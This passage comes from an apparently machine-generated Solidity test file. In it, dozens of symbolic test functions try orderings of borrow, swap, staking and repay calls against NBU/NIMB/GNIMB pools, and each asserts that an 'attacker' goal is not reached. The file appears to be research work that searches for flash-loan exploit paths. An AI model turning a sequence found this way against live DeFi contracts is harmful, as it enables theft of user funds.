        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2519(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2520(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2521(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2522(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2523(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2524(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2525(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2526(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2527(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2528(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2529(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2530(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2531(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2532(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2533(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2534(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2535(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2536(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2537(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2538(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2539(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2540(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2541(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2542(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2543(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2544(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2545(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2546(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2547(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2548(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2549(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2550(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2551(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2552(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2553(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2554(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2555(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2556(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2557(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2558(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2559(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2560(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2561(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2562(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2563(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2564(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2565(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2566(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2567(
        uint256 amt0,
        uint256 amt1,
